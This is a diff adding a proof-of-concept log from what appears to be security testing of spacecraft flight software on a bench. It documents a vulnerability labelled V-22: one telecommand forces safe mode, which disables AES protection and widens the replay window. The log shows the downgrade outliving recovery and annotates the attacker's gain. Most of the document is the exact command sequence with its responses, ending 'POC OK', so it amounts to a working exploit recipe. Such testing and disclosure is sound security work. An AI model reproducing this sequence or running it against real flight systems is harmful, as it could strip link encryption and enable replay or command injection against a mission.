@@ -1,0 +1,111 @@
+[   0.000] ========================================================================
+[   0.000] V-22 forced safe-mode protection downgrade
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.853] --> TC apid=0x0A via=usb AES  payload=00
+[   8.905] <-- TM apid=0x0A clear len=3
+[   8.957] --> TC apid=0x1D via=usb clear payload=0101
+[   9.008] <-- TM apid=0x1D clear len=4
+[   9.009] --> TC apid=0x11 via=usb clear payload=00
+[   9.459] <-- TM apid=0x11 clear len=9
+[   9.459] --> TC apid=0x15 via=usb clear payload=001005
+[   9.919] <-- TM apid=0x15 clear len=6
+[   9.919] --> TC apid=0x0D via=usb clear payload=01
+[  10.370] <-- TM apid=0x0D clear len=4
+[  10.411] --> TC apid=0x1D via=usb clear payload=03
+[  10.463] <-- TM apid=0x1D clear len=4
+[  10.463] <-- TM apid=0x09 clear len=9
+[  10.514] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.566] <-- TM apid=0x1D clear len=4
+[  10.566] --> TC apid=0x10 via=usb clear payload=00
+[  10.618] <-- TM apid=0x10 clear len=4
+[  10.618] --> TC apid=0x21 via=usb clear payload=00
+[  11.068] <-- TM apid=0x21 clear len=6
+[  11.068] --> TC apid=0x24 via=usb clear payload=0000
+[  11.119] <-- TM apid=0x24 clear len=8
+[  11.119] --> TC apid=0x24 via=usb clear payload=0100
+[  11.171] <-- TM apid=0x24 clear len=8
+[  11.171] --> TC apid=0x24 via=usb clear payload=0200
+[  11.212] <-- TM apid=0x24 clear len=8
+[  11.212] --> TC apid=0x24 via=usb clear payload=0300
+[  11.264] <-- TM apid=0x24 clear len=8
+[  11.264] --> TC apid=0x25 via=usb clear payload=0080
+[  11.316] <-- TM apid=0x25 clear len=4
+[  11.316] --> TC apid=0x1E via=usb clear payload=01
+[  11.828] <-- TM apid=0x1E clear len=5
+[  11.828] --> TC apid=0x1D via=usb clear payload=0b
+[  11.920] <-- TM apid=0x1D clear len=4
+[  11.920] --> TC apid=0x05 via=usb clear payload=12
+[  12.380] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.881] <-- TM apid=0x1F clear len=4
+[  12.881] --> TC apid=0x1F via=usb clear payload=05
+[  13.384] <-- TM apid=0x1F clear len=4
+[  13.384] --> TC apid=0x0A via=usb clear payload=01
+[  13.428] <-- TM apid=0x0A AES len=3
+[  21.519] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.988] <-- TM apid=0x0E AES len=18
+[  29.988] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.070] --> TC apid=0x15 via=usb AES  payload=011005
+[  30.528] <-- TM apid=0x15 clear len=6
+[  30.528] --> TC apid=0x15 via=usb AES  payload=011005
+[  30.976] <-- TM apid=0x15 clear len=6
+[  30.976] --> TC apid=0x0C via=usb AES  payload=-
+[  31.030] <-- TM apid=0x0C AES len=27
+[  31.030] nominal: secure=True arc_window=5
+[  31.030] --> TC apid=0x1D via=radio AES  payload=02
+[  31.072] <-- TM apid=0x1D clear len=4
+[  31.123] --> TC apid=0x0C via=usb clear payload=-
+[  31.174] <-- TM apid=0x0C clear len=27
+[  31.174] --> TC apid=0x15 via=usb clear payload=011005
+[  31.632] <-- TM apid=0x15 clear len=6
+[  31.632] in safe: secure=False arc_window=15 (AES engine OFF, replay window relaxed 5 -> 15)
+[  31.633] --> TC apid=0x1D via=usb clear payload=03
+[  31.684] <-- TM apid=0x1D clear len=4
+[  31.684] <-- TM apid=0x09 clear len=15
+[  31.684] --> advance(121000 ms)
+[ 152.732] <-- TM apid=0x27 clear len=4
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x0E clear len=30
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x3FF clear len=14
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x0E clear len=30
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x3FF clear len=14
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x0E clear len=30
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x0E clear len=30
+[ 152.732] <-- TM apid=0x3FF clear len=14
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x0E clear len=30
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.732] <-- TM apid=0x08 clear len=20
+[ 152.732] <-- TM apid=0x3FF clear len=14
+[ 152.732] <-- TM apid=0x01 clear len=8
+[ 152.732] <-- TM apid=0x01 clear len=64
+[ 152.784] --> TC apid=0x1D via=usb clear payload=03
+[ 152.836] <-- TM apid=0x1D clear len=4
+[ 152.887] --> TC apid=0x0C via=usb clear payload=-
+[ 152.939] <-- TM apid=0x0C clear len=27
+[ 152.939] after recovery: NOMINAL again but secure=False -> downgrade OUTLIVES the safe-mode episode
+[ 152.939] cost to attacker: 1 TC; benefit: >=120 s relaxed replay window + permanent cleartext telemetry until the operator notices
+[ 152.940] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x015 SEQ=1 LEN=3 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [ERROR] Unpacking SPP: -1 | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[ 152.940] ========================================================================
+[ 152.940] POC OK
+[ 152.940] ========================================================================
